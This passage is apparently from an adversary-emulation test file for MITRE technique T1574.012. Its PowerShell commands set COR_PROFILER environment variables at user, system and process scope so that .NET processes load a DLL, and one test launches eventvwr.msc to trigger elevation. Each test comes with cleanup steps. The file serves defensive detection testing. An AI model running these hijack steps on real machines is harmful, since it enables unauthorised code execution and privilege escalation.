        New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | Out-Null
        New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value "PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll" -Force | Out-Null
        Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
        START MMC.EXE EVENTVWR.MSC
      cleanup: "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Recurse -Force -ErrorAction Ignore \nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null"
      timeout: 120
      is_safe: true
    - name: System Scope COR_PROFILER
      type: powershell
      platform: windows
      command: |-
        Write-Host "Creating system environment variables" -ForegroundColor Cyan
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value "PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll" -Force | Out-Null
      cleanup: |-
        Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -Force -ErrorAction Ignore | Out-Null
        Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -Force -ErrorAction Ignore | Out-Null
        Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -Force -ErrorAction Ignore | Out-Null
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Registry-free process scope COR_PROFILER
      type: powershell
      platform: windows
      command: |-
        $env:COR_ENABLE_PROFILING = 1
        $env:COR_PROFILER = '{09108e71-974c-4010-89cb-acf471ae9e2c}'
        $env:COR_PROFILER_PATH = '"PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll"'
        POWERSHELL -c 'Start-Sleep 1'
      cleanup: |-
        $env:COR_ENABLE_PROFILING = 0
        $env:COR_PROFILER = ''
        $env:COR_PROFILER_PATH = ''
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1574/012
  is_safe: true
